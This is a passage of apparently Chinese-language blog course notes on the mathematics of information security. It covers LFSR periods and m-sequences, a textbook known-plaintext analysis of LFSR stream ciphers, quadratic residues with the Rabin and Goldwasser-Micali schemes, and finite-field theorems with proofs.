f(x)|x^{\rho(g)p^t}-1$<br>另一方面，$f(x)|x^{\rho(f)}-1,\therefore f(x)|(x^{\rho(f)}-1,x^{\rho(g)p^t}-1)=x^{(\rho(f),\rho(g)p^t)}-1$<br>$\therefore \rho(f)=(\rho(f),\rho(g)p^t),\rho(f)|\rho(g)p^t$（信数定理，$\rho(f)$应该是满足$f(x)|x^m-1$的最小次数）<br>同样，$g(x)|f(x)\Rightarrow g(x)|x^{\rho(f)}-1\Rightarrow \rho(g)|\rho(f)$<br>这说明$\rho(f)$是形如$\rho(g)p^s(0\le s\le t)$的整数<br>设$\rho(f)=\rho(g)p^s,s&lt;t,p^s&lt;b,f(x)|x^{\rho(g)p^s}-1,g(x)^b|x^{\rho(g)p^s}-1=(x^{\rho(g)}-1)^{p^s}$<br>$g(x)^{b-p^s}|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})\Rightarrow g(x)^2|x^{\rho(g)}-1$（说明$x^{\rho(g)}-1$应该有重因式）<br>$(\rho(g),p)=1,(x^{\rho(g)}-1,(x^{\rho(g)}-1)’)=1$<br>$\therefore x^{\rho(g)}-1$无重因式，矛盾（信数定理）。故原命题成立<br><strong><font color=blue>引理3</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0$，且$f(x)=\prod_{i=1}^sf_i(x)$，其中$f_i(x)$是$F_q[x]$中两两互素的多项式，则$\rho(f)=[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>证明：<br>$f_i(x)|x^{\rho(f_i)}-1,\rho(f_i)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>$\Rightarrow f_i(x)|x^{[\rho(f_1),\rho(f_2),…,\rho(f_s)]}-1$<br>$\Rightarrow \rho(f)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$（$f_i(x)$两两互素！）<br>又$f_i(x)|f(x),f(x)|x^{\rho(f)}-1$<br>$\Rightarrow f_i(x)|x^{\rho(f)}-1\Rightarrow \rho(f_i)|\rho(f)$<br>$\Rightarrow [\rho(f_1),\rho(f_2),…,\rho(f_s)]|\rho(f)$<br>$\therefore \rho(f)=[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br><strong><font color=red>定理1</font></strong> 设$T$的极小多项式为$h(x)\in F_q[x]$，若$f(x)\in F_q[x]$满足$f(T)=0$，那么$h(x)|f(x)$<br><strong><font color=red>定理2</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$f(x)$是T的极小多项式<br><strong><font color=red>定理3</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$\rho(T)=\rho(f)$<br><strong><font color=red>定理4</font></strong> 给定$F_q$上任意一个非零周期序列$a$，可以找到一个能产生序列$a$的线性反馈移位寄存器L，它的特征多项式$f(x)$满足：对于可产生$a$的任意线性反馈移位寄存器，若其特征多项式为g(x)，都有$f(x)|g(x)$。满足上述条件的f(x)唯一<br><strong><font color=purple>定义5</font></strong> 定理4描述的首1特征多项式f(x)为序列$a$的极小多项式<br><strong><font color=red>定理5</font></strong> 非零周期序列$a$的周期等于其极小多项式f(x)的周期</p>
<p>m序列的伪随机性：<br>(1) 若t为奇数，则0-1序列的一个周期内0的个数比1的个数多1个或少1个，若t为偶数则其个数相等<br>(2) 在长度为t的周期内，1游程的个数为游程总数的1/2，2游程的个数为总数的1/2^2^，以此类推。（n游程：连续的n个0或1序列，且前后为1或0。如00110001中第2~3为是一个1的2游程）<br>(3) 异相自相关函数为常数（自相关函数：定义在Z~2~上的周期序列a~0~a~1~…则$c_a(\tau)=\sum_{i=0}^{t-1}\eta(a_i)\eta(a_{i+\tau}),\tau\in Z$，其中$\eta$是Z~2~上的加法群到{1,-1}的乘法群的同构$\eta(0)=1,\eta(1)=-1$，有$\eta(a+b)=\eta(a)\eta(b)$）<br>平衡特性：m序列1个数比0个数多1<br>游程特性：1的最大游程为n游程，有且仅有1个；1个0的n-1游程。n&gt;2时，设r为不超过n-2的任一整数，则任何1的r游程数目为$1+\sum_{r=1}^{n-2}2^{n-r-2}=2^{n-2}$；出现0游程的个数为$2^{n-2}$,游程总数为$2^{n-i}$<br>自相关特性：$c_a(\tau)=\sum_{i=0}^{2^n-2}\eta(a_i)\eta(a_{i+\tau})=2^n-1,\tau\equiv 0(\mod 2^n-1); =-1, \tau \ne 0(\mod 2^n-1)$</p>
<p>异步流密码的加密和解密是一个对称的加解密过程。</p>
<h4 id="LFSR流密码分析："><a href="#LFSR流密码分析：" class="headerlink" title="LFSR流密码分析："></a>LFSR流密码分析：</h4><p>分析目标为：获取LFSR的结构（即密钥——LFSR的初态z~0~,z~1~,…和递推公式[抽头序列c~1~,c~2~,…]），使用唯密文攻击较为困难，使用一直明文攻击。<br>$z_k=\sum_{j=1}^nc_jz_{k-j}$<br>如果能够得到长度不小于2n的明文-密文对，就容易求出其初态和抽头序列（假设n已知）<br>密钥比特流可以直接将明密文求和得到，其中前面的一组作为初态</p>
<script type="math/tex; mode=display">(z_n,z_{n+1},...,z_{2n-1})=(c_n,c_{n-1},...,c_1)\begin{pmatrix}z_0 & z_1 & ... & z_{n-1}\\
z_1&z_2&...&z_n\\
...&...&...&...\\
z_{n-1}&z_n&...&z_{2n-2}\end{pmatrix}</script><p>根据上式可计算$(c_n,c_{n-1},…,c_1)$的值</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E4%B8%8E%E6%96%B9%E6%A0%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E4%B8%8E%E6%96%B9%E6%A0%B9/" class="post-title-link" itemprop="url">信息安全数学基础 Chapter 4——二次剩余与方根</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:54:47" itemprop="dateCreated datePublished" datetime="2023-02-28T22:54:47+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">信息安全数学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>4.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><font color=blue>定义4.1</font> 设m为正整数，若同余式$x^2\equiv a(\mod m),(a,m)=1$，有解，则a称为模m的二次剩余，否则称为模m的二次非剩余</p>
<p><font color=blue>定义4.2</font> 勒让德符号：$(\frac{a}{p})$，当a为模p的二次剩余时，值为1；非2次剩余时值为-1，若$p|a$则值为0</p>
<p><font color=red>定理4.1</font> p为素数，若$a\equiv b(\mod p)$，则$(\frac{a}{p})=(\frac{b}{p})$<br>求同余式$x^2\equiv a(\mod p)$的解可以看成是在有限域$\mathbb Z_p$中求多项式$x^2-a$的根。</p>
<p><font color=red>定理4.2</font> 欧拉判别法则：p为奇素数，则对于任意整数a，$(\frac{a}{p})\equiv a^{\frac{p-1}{2}}(\mod p)$<br>证明：<br>设$g$是$\mathbb Z_p$的本原元，则$\mathbb Z_p^*=\{g^0,g^1,…,g^{p-2}\}$<br>对于所有$0\le i\le \frac{p-1}{2}$，$(g^{2i})^{\frac{p-1}{2}}=(g^{p-1})^i=1,(g^{2i+1})^{\frac{p-1}{2}}=(g^{p-1})^ig^{\frac{p-1}{2}},g^{\frac{p-1}{2}}=-1$（由g为本原元可知$g^{\frac{p-1}{2}}\ne 1$，但$(g^{\frac{p-1}{2}})^2= 1$，故其只能为-1），故$(g^{\frac{p-1}{2}})^{2i+1}=-1$<br>由于考虑模p的二次同余式，因此a可以看做是$\mathbb Z_p$中与之同余等价的元素<br>当$a\equiv g^{2i}(\mod p),0\le i&lt;\frac{p-1}{2}$，多项式$x^2-a=x^2-g^{2i}$有根±g^i^，故$(\frac{a}{p})=1\equiv a^{\frac{p-1}{2}}(\mod p)$<br>当$a\equiv g^{2i+1}(\mod p),0\le i&lt;\frac{p-1}{2}$，多项式$x^2-a=x^2-g^{2i+1}$一定没有根。否则若$x_0^2=g^{2i+1}$，那么$1=(x_0^2)^{\frac{p-1}{2}}=(g^{2i+1})^{\frac{p-1}{2}}=-1$矛盾。故$(\frac{a}{p})=-1\equiv a^{\frac{p-1}{2}}(\mod p)$</p>
<p><strong>由上述定理可知，模p的二次剩余有$\frac{p-1}{2}$个（本原元的所有偶数次幂）</strong></p>
<p><font color=green>推论</font> 设p为奇素数，则<br>$(\frac{1}{p})=1$<br>$(\frac{-1}{p})=(-1)^\frac{p-1}{2}$<br>$(\frac{ab}{p})=(\frac{a}{p})(\frac{b}{p})$<br>$(\frac{a^n}{p})=(\frac{a}{p})^n,n&gt;0$</p>
<p><font color=red>定理4.3</font> 设p为奇素数，则$(\frac{2}{p})=(-1)^{\frac{p^2-1}{8}}$<br>证明：<strong>构造证明</strong><br>$(p-1)!\equiv 1\cdot 3\cdot 5\cdot … \cdot (p-2)\cdot 2\cdot 4\cdot … \cdot (p-1)$<br>对于4k+1型的p有<br>$\equiv 1\cdot (p-2)\cdot 3\cdot (p-4)\cdot 5\cdot …\cdot \frac{p-3}{2}\cdot (p-\frac{p-1}{2})\cdot 2^{\frac{p-1}{2}}\cdot (\frac{p-1}{2}!)(\mod p)$（后面一半所有偶数提个2出来，前半部分可以交替提一个-1）<br>$\equiv (-1)^{\frac{p-1}{4}}\cdot 2^{\frac{p-1}{2}}\cdot(\frac{p-1}{2}!)^2(\mod p)$<br>对于4k+3型的p有<br>$\equiv 1\cdot (p-2)\cdot 3\cdot (p-4)\cdot 5\cdot …\cdot(p-\frac{p-3}{2})\cdot\frac{p-1}{2}\cdot 2^{\frac{p-1}{2}}\cdot (\frac{p-1}{2}!)(\mod p)$<br>$\equiv (-1)^{\frac{p-3}{4}}\cdot 2^{\frac{p-1}{2}}\cdot(\frac{p-1}{2}!)^2(\mod p)$<br>Wilson定理知$(p-1)!\equiv -1(\mod p)$，及$(\frac{p-1}{2}!)^2\equiv(-1)^{\frac{p+1}{2}}(\mod p)$ <strong>（转化为$(-1)^{\frac{p-1}{2}}(p-1)!$）</strong> 可知当$p\equiv ±1(\mod 8)$时，$2^{\frac{p-1}{2}}\equiv 1(\mod p)$，当$p\equiv ±3(\mod 8)$时，$2^{\frac{p-1}{2}}\equiv -1(\mod p)$，综合验证得$2^{\frac{p-1}{2}}\equiv(-1)^{\frac{p^2-1}{8}}(\mod p)$，由欧拉判别法则$(\frac{2}{p})=(-1)^{\frac{p^2-1}{8}}$</p>
<p><font color=red>定理4.4</font> 二次互反律：p，q是互素奇素数，则$(\frac{q}{p})=(-1)^{\frac{p-1}{2}\frac{q-1}{2}}(\frac{p}{q})$<br>证明：太复杂了，不要求掌握</p>
<p><font color=blue>定义4.3</font> 雅可比符号：$m=\prod_{i=1}^np_i,p_i$是奇素数，对于任意整数a定义a模m的雅可比符号为$(\frac{a}{m})=\prod_{i=1}^n(\frac{a}{p_i})$，m为奇素数时，其雅克比符号就是勒让德符号。</p>
<p><font color=red>定理4.5</font> 设m为正奇数，$a\equiv b(\mod m)\Rightarrow (\frac{a}{m})=(\frac{b}{m})$</p>
<p><font color=red>定理4.6</font> 设m为正奇数，则<br>(1) $(\frac{1}{m})=1$<br>(2) $(\frac{ab}{ m})=(\frac{a}{m})(\frac{b}{m})$<br>(3) $(\frac{a^n}{m})=(\frac{a}{m})^n$<br>(4) $(\frac{-1}{m})=(-1)^{\frac{m-1}{2}}$<br>(5) $(\frac{2}{m})=(-1)^{\frac{m^2-1}{8}}$</p>
<p><font color=red>定理4.7</font> 设m,n为正奇数，则$(\frac{n}{m})=(-1)^{\frac{m-1}{2}\frac{n-1}{2}}(\frac{m}{n})$</p>
<p><font color=blue>定义4.4</font> 二次剩余问题：未知n的分解式的情况下，一般性地判断一个整数a是否是模n的二次剩余是一个难解的问题，称为二次剩余问题。</p>
<p><font color=orange>加密算法1——Rabin加密算法</font><br>Alice选择两个4k+3型的素数（称为Blum素数）p,q，计算n=pq，将p，q作为私钥公开n。<br>加密：明文为整数m，密文c=m^2^(mod n)<br>解密：解同余方程c=x^2^(mod n)可以得到4个解，选择其中有意义的解作为明文m。</p>
<p><font color=pink>计算方法——a=x^2^(mod p)，p=4k+3的解法</font><br>若上式有解，则在[0,p-1]中一定有解，因此数字不大时可以对a一直加p直到找到一个完全平方数即可（这种方法对p无4k+3的限制，但是p很大时不方便）<br>由$(\frac{a}{p})=1$由欧拉判别法则$a^{\frac{p-1}{2}}\equiv 1(\mod p)$，故有$(a^{\frac{p-1}{4}})^2\equiv a(\mod p)$，故解为$x\equiv ±a^{\frac{p-1}{4}}(\mod p)$</p>
<p><font color=orange>加密算法2——Goldwasser-Micali加密算法</font><br>Alice选择两个不同的素数p，q，和整数y满足$(\frac{y}{p})=(\frac{y}{q})=-1$。计算n=pq，p和q座位私钥公开n，y<br>加密：将二进制整数m作为明文，第i位记为b~i~，对于每一位，随机选择0&lt;x~i~&lt;n，若该位为0计算c~i~=x~i~^2^(mod n)，否则计算c~i~=yx~i~^2^(mod n)，密文为所有的c<br>解密：若c~i~为模n的二次剩余，则判断b~i~=0，否则b~i~=1</p>
<p><font color=blue>定义4.5</font> 设\<g\>是一个由元素g生成的一个n元循环群，则对于任意a∈\<g\>，存在0≤i&lt;n，a=g^i^，称i为以g为底a的指标，记作ind~g~a。求指标的问题，在密码学中通常称为离散对数问题。n充分大的整数时求解离散对数问题为一个难解问题。</p>
<p><font color=red>定理4.8</font> 设\<g\>是一个n元循环群，a∈\<g\>，如果对于正整数m有：<br>(1) a^m^=e<br>(2) 对于任意素因子p|m，$a^{\frac{m}{p}}\ne e$，则ord(a)=m，且m|n</p>
<p><font color=blue>定义4.8</font> 原根：设m为正整数，整数a满足(a,m)=1，a模m的阶ord~m~(a)是指a(mod m)在$\mathbb Z_m^<em>$中的阶；如果$\mathbb Z_m^</em>$为循环群，整数a称为模m的原根是指a(mod m)为$\mathbb Z_m^*$的生成元</p>
<p>根据上述定义，a所在模m剩余类中所有整数的模m阶均为ord~m~(a)</p>
<p>根据原根定义：当m=2,4时，模m原根分别为1,3<br>一般地，当且仅当m=2,4,p^a^,2p^a^（p为奇素数，a≥1），模m有原根</p>
<p><font color=red>定理4.9</font> 设\<g\>是一个n元循环群，a，b∈\<g\>，则ind~g~ab$\equiv$ind~g~a+ind~g~b(mod n)<br>证明：ind~g~a=x，ind~g~b=y，则g^x+y^=ab=$g^{ind_gab}$<br>即$g^{x+y-ind_gab}=e$，又ord(g)=n，故n|x+y-ind~g~ab，故结论成立</p>
<p><font color=blue>定义4.9</font> 设m是大于1的正整数，如果n次同余式x^n^=a(mod m), (a,m)=1有解，则a称作模m的n次剩余，否则为模m的n次非剩余。</p>
<p><font color=red>定理4.14</font> （高次剩余）设m为大于1的正整数，g为模m的一个原根，(a,m)=1，d=(n,$\varphi$(m))，那么x^n^=a(mod m)有解的充要条件为$a^{\frac{\varphi(m)}{d}}\equiv 1(\mod m)$<br>证明：g为模m的一个原根，所以$\mathbb Z_m^<em>=<g>,x^n\equiv a(\mod m)$有解的充要条件是$ind_gx^n=ind_ga\Rightarrow nind_gx\equiv ind_ga(\mod \varphi(m))$<em>*（注意模m的循环群一共只有$\varphi(m)$个元素，因此要模$\varphi(m)$！）</em></em>，令X=ind~g~x，则有$nX\equiv ind_ga(\mod \varphi(m))$<br>该一次同余式有解的充要条件为(n,φ(m))|ind~g~a，即d|ind~g~a，等价于ind~g~a$\equiv$ 0(mod d)<br>由定理2.4(4)有$\frac{\varphi(m)}{d}ind_ga\equiv 0(\mod \varphi(m))$。两边取“指数”得$a^{\frac{\varphi(m)}{d}}\equiv 1(\mod m)$，故原命题成立。</p>
<p><strong>注</strong>：该定理还能帮助求解高次同余式的解数。对于同余式$ax\equiv b(\mod m)$，其有解的充要条件为$(a,m)|b$，且通解可以写成$x=x_0+\frac{m}{(a,m)}t,t=0,1,…,(a,m)-1$的形式，因此解的数量为$(a,m)$。那么$nX\equiv ind_ga(\mod \varphi(m))$的解数应该有$(n,\varphi(m))$个</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">信息安全数学基础 Chapter 3——有限域（二）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:53:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:53:26+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">信息安全数学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>815</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <font color=purple>定理3.20</font> 设$\mathbb F_q$为q元有限域，$f(x)\in \mathbb F_q[x]$为n次不可约多项式，那么有$f(x)|x^{q^n}-x$

<font color=dblue>证明方法：</font>构造$f(x)$的扩域$\mathbb F_q[x]_{f(x)}$，对于任意$x\in F_q[x]_{f(x)}$均有$x^{q^n}-x=0$（定理3.19），则有$(x^{q^n}-x)_{f(x)}=0$（定理3.7）。证毕。

---

<font color=purple>定理3.21</font> 设$m,n$均为正整数，则有$(x^m-1,x^n-1)=x^{(m,n)}-1$

<font color=dblue>证明方法：</font>归纳法。
当$max\{m,n\}=1$时显然成立
假设当$max\{m,n\}=k$时成立，若$m>n$，那么有$(x^m-1,x^n-1)=(x^{m-n}-1,x^n-1)$（定理3.11），此时$max\{m,n\}<k$，故成立。

<font color=orange>推论</font> 设$m,n,q$为整数，则$(x^{q^m}-x,x^{q^n}-x)=x^{q^{(m,n)}}-x$（使用上面定理即可，证明略）

---

<font color=purple>定理3.22</font> 设$\mathbb F_q$为q元域，$n$为正整数，$f(x)\in\mathbb F_q[x]$为m次不可约多项式，且$m>n$，那么$f(x)∤x^{q^n}-x$

<font color=dblue>证明方法：</font>反证法。

假设能够整除。则有$x^{q^n}_{f(x)}=x_{f(x)}$
对于任意$\mathbb F_q[x]_{f(x)}$中元素$g(x)=\sum_{i=0}^{m-1}a_ix^i$，有
$$g(x)^{q^n}=\sum_{i=0}^{m-1}(a_ix^i)^{q^n}$$
（二项式定理）
根据定理3.19有
$$g(x)^{q^n}=\sum_{i=0}^{m-1}a_i(x^i)^{q^n}$$
注意$(a_i)^{q^n}=a_i$
因此
$$(g(x)^{q^n}-g(x))_{f(x)}=\sum_{i=0}^{m-1}a_i((x^i)^{q^n}-x^i)_{f(x)}=\sum_{i=0}^{m-1}a_i((x^{q^n})^i-x^i)_{f(x)}=\sum_{i=0}^{m-1}a_i(x^i-x^i)_{f(x)}=0$$

故任意$\mathbb F_q[x]_{f(x)}$中元素均是$x^{q^n}-x$的根，而$n<m$，故矛盾。

---

<font color=purple>定理3.23</font> 设$\mathbb F_q$为q元域，$n,d$为正整数，$f(x)\in\mathbb F_q[x]$为$d$次不可约多项式，那么有$f(x)|x^{q^n}-x$当且仅当$d|n$。

<font color=dblue>证明方法：</font>
充分性：$f(x)|x^{q^d}-x$，根据定理3.21，$x^{q^d}-x|x^{q^n}-x$，证毕
必要性：$f(x)|x^{q^d}-x,f(x)|x^{q^n}-x\Rightarrow f(x)|(x^{q^d}-x, x^{q^n}-x)=x^{q^{(d,n)}}-x$，又$\deg(f(x))=d\le (d,n)$，故$d|n$

---

<font color=blue>定义3.10</font> 导式

---

<font color=blue>定义3.11</font> 重因式、k重因式、重根、k重根、导式

---

<font color=purple>定理3.24</font> $\mathbb F_q$为q元有限域，$f(x),g(x)\in\mathbb F_q[x]$，若$g(x)$是$f(x)$的k重因式，则$g(x)^{k-1}|f'(x)$

<font color=dblue>证明方法：</font>求导

<font color=orange>推论1</font> $\mathbb F_q$为q元有限域，$f(x)\in\mathbb F_q[x]$，若$(f(x),f'(x))=1$，则$f(x)$在域$\mathbb F_q$上没有重因式，也没有重根。（证明反证法）
<font color=orange>推论2</font> $\mathbb F_q$为q元有限域，n为正整数，则$x^{q^n}-x$在域$\mathbb F_q$上没有重因式。（用推论1证明）

<font color=red>$x^{q^n}-x$可以表示为所有次数为n的因子的首1不可约多项式的乘积，每个因式仅出现一次 **（注意理解：n的因子！如当n=4时，所有1、2、4次不可约多项式都是其因子）** </font>

<hr>
<font color=purple>定理3.25</font> 设$\mathbb F_q$为q元域，n为正整数，那么$\mathbb F_q$上一定存在n次不可约多项式。

<font color=dblue>证明方法：</font>容斥原理

$\phi(k)$为$\mathbb F_q$上次数为$k$的因子的首1不可约多项式的乘积，即$\phi(k)=x^{q^k}-x$，$A$为$n$次首1不可约多项式的乘积。
设$n=\prod_{i=1}^S p_i^{\alpha_i}$
$$A=\phi(n)\cdot\prod_{1\le i\le S}\phi(\frac{n}{p_i})^{-1}\prod_{1\le i_1<i_2\le S}\phi(\frac{n}{p_{i_1}p_{i_2}})...\phi(\frac{n}{p_1p_2...p_S})^{(-1)^S}$$

首先，次数不是n的因子的首1不可约多项式，在等式两边都不出现。
其次，任何一个次数为n的首1不可约多项式在等式两边各出现1次，分别在$A$和$\phi(n)$中
再者，对于任意$d|n,d<n$，设
$$d=p_1^{f_1}p_2^{f_2}...p_r^{f_r}p_{r+1}^{\alpha_{r+1}}...p_S^{\alpha_S}$$
那么在$\frac{n}{p_{i_1}p_{i_2}...p_{i_t}}(0\le t<s,1\le i_1<i_2<...<i_t\le S)$中，只有n,$\frac{n}{p_i}(1\le i\le r),\frac{n}{p_ip_j}(1\le i<j\le r),...,\frac{n}{p_1p_2...p_r}$以d为因子，所以任一d次首1不可约多项式在等式右边出现的次数为：$1-\begin{pmatrix} r \\ 1 \end{pmatrix}+\begin{pmatrix} r \\ 2 \end{pmatrix}-...+(-1)^r\begin{pmatrix} r \\ r \end{pmatrix}=(1-1)^r=0$。显然其在左边出现次数也为0，等式得证。

又$\phi(n)=x^{q^n}-x$，所以
$$\deg A=q^n-\sum_{1\le i\le S}q^{\frac{n}{p_i}}+\sum_{1\le i_1<i_2\le S}q^{\frac{n}{p_{i_1}p_{i_2}}}+...+(-1)^S q^\frac{n}{p_1p_2...p_S}$$
故$\deg A\equiv (-1)^Sq^\frac{n}{p_1p_2...p_S}\ne 0 (\mod q^{\frac{n}{p_1p_2...p_S}+1})$[$q^{\frac{n}{p_1p_2...p_S}+1}|q^n$，前面项全消去仅剩最后一项]，故$\deg A>0$，因此$A$至少包含1个不可约多项式

---

<font color=purple>定理3.26</font> 对于任意素数$p$，正整数$n$，$p^n$元有限域一定存在。

<font color=dblue>证明方法：</font>根据定理3.25能在$\mathbb Z_p$找到n次不可约多项式，因此可以根据定理3.16构造一个元素个数为$p^n$的有限域。

---

<font color=red>若$\mathbb F_{q^n}$是$\mathbb F_q$的扩域，则$\mathbb F_{q^n}$可以看做$\mathbb F_q$的n维向量空间，一组基能够按照定理3.18的方式构造：$\{1,\beta_1,\beta_2,...\beta_{n-1}\}$，$\mathbb F_{q^n}$中任意一个元素可以唯一表示为</font>
$$a_0+a_1\beta_1+...+a_{n-1}\beta_{n-1},a_i\in\mathbb F_q$$
的形式。

如$\{1,x,x^2,...,x^{n-1}\}$就是一组基。

---

<font color=green>引理1</font> 设群$G$的元素$\alpha$的阶为$n$，则对于任意整数m，$ord(\alpha^m)=\frac{n}{(m,n)}$

证明：设$ord(a^m)=d$，分别证明$d|\frac{n}{(m,n)},\frac{n}{(m,n)}|d$即可。
$d|\frac{n}{(m,n)}$易证
$(\alpha^m)^d=1$，故$n|md$，即$\frac{n}{(m,n)}|\frac{m}{(m,n)}d$，且有$(\frac{m}{(m,n)},\frac{n}{(m,n)})=1$，故$\frac{n}{(m,n)}|d$

---

<font color=green>引理2</font> 设群$G$中，$ord(\alpha)=m,ord(\beta)=n$，若$(m,n)=1$，则$ord(\alpha\beta)=mn$
证明：证明思路与引理1相同
$d|mn$易证
$(\alpha\beta)^d=1$，故$\alpha^d=\beta^{-d}$，故$ord(\alpha^d)=\frac{m}{(d,m)}=\frac{n}{(-d,m)}=ord(\beta^{-d})$。$(m,n)=1\Rightarrow(\frac{m}{(d,m)},\frac{n}{(d,n)})=1,\frac{m}{(d,m)}=\frac{n}{(d,n)},\therefore \frac{m}{(d,m)}=\frac{n}{(d,n)}=1$。故$m|d,n|d\Rightarrow mn|d$

---

<font color=purple>定理3.27</font> 有限域的乘法群是循环群。

<font color=dblue>证明方法：</font>设$\mathbb F_{p^n}$是元素个数为$p^n$的有限域，其乘法群元素个数为$p^n-1$，设$\alpha$是其中阶最大的元素，设其阶$ord(\alpha)=d$，则$d|p^n-1$，故有$d\le p^n-1$。
